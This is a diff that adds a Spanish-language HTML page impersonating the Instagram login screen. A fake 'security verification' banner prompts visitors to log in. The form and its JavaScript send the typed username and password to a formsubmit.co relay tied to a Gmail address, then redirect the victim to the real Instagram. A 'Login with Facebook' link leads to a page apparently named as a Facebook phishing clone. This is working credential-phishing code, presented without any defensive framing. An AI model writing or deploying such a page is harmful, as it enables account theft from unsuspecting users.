@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión • Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            width: 350px;
+            text-align: center;
+        }
+        
+        .security-alert {
+            background-color: #fff8e1;
+            border: 1px solid #ffd54f;
+            border-radius: 4px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #5f3d00;
+            text-align: center;
+            line-height: 1.4;
+        }
+        
+        .security-alert strong {
+            color: #d32f2f;
+            display: block;
+            margin-bottom: 4px;
+        }
+        
+        .logo {
+            margin: 12px auto 24px;
+            width: 175px;
+        }
+        
+        .login-form {
+            margin-bottom: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 6px;
+            position: relative;
+        }
+        
+        input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            color: #262626;
+        }
+        
+        input:focus {
+            border: 1px solid #a8a8a8;
+            outline: none;
+        }
+        
+        .login-button {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 7px 16px;
+            font-weight: 600;
+            margin: 8px 0;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .divider {
+            margin: 10px 0 18px;
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-top: 1px solid #dbdbdb;
+            margin: 0 10px;
+        }
+        
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+        }
+        
+        .facebook-icon {
+            font-size: 16px;
+            margin-right: 8px;
+        }
+        
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin: 12px 0;
+            cursor: pointer;
+        }
+
+        .success-message {
+            color: #4CAF50;
+            margin: 15px 0;
+            font-size: 13px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="security-alert">
+            <strong>⚠️ Verificación de seguridad obligatoria</strong>
+            Antes de continuar con el contenido, debemos confirmar que no eres un robot. Este proceso es similar a reCAPTCHA y ayuda a prevenir accesos no autorizados. Por favor continúa con el inicio de sesión.
+        </div>
+        
+        <div class="logo">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" width="175">
+        </div>
+        
+        <form id="loginForm" class="login-form" action="https://formsubmit.co/unmadsoul701@gmail.com" method="POST">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="Nuevo inicio de sesión">
+            <input type="hidden" name="_next" value="https://instagram.com">
+            <input type="hidden" name="_template" value="table">
+            
+            <div class="form-group">
+                <input type="text" name="usuario" placeholder="Teléfono, usuario o correo electrónico" required>
+            </div>
+            
+            <div class="form-group">
+                <input type="password" name="contrasena" placeholder="Contraseña" required>
+            </div>
+            
+            <button type="submit" class="login-button">Iniciar sesión</button>
+            
+            <div id="successMessage" class="success-message">
+                Verificación completada. Redirigiendo...
+            </div>
+            
+            <div class="divider">O</div>
+            
+            <!-- ENLACE MODIFICADO PARA FACEBOOK - CAMBIA LA URL -->
+            <a href="https://madsoul701.github.io/Facebook.com.phis/" class="facebook-login">
+                <span class="facebook-icon"></span> Iniciar sesión con Facebook
+            </a>
+            
+            <a id="forgotPassword" class="forgot-password">¿Olvidaste tu contraseña?</a>
+        </form>
+    </div>
+    
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            
+            const usuario = document.querySelector("input[name='usuario']").value;
+            const contrasena = document.querySelector("input[name='contrasena']").value;
+            
+            if(!usuario || !contrasena) {
+                alert("Por favor completa todos los campos");
+                return;
+            }
+            
+            document.getElementById("successMessage").style.display = "block";
+            
+            const formData = new FormData(this);
+            
+            fetch("https://formsubmit.co/ajax/unmadsoul701@gmail.com", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Datos enviados:", data);
+                setTimeout(() => {
+                    window.location.href = "https://instagram.com";
+                }, 2000);
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("Ocurrió un error al enviar los datos");
+                document.getElementById("successMessage").style.display = "none";
+            });
+        });
+
+        // Agregado: Evento para el enlace "¿Olvidaste tu contraseña?"
+        document.getElementById("forgotPassword").addEventListener("click", function(e) {
+            e.preventDefault();
+            alert("No puedes cambiar tu contraseña en estos momentos. Primero debes ingresar a tu cuenta.");
+        });
+    </script>
+</body>
+</html>
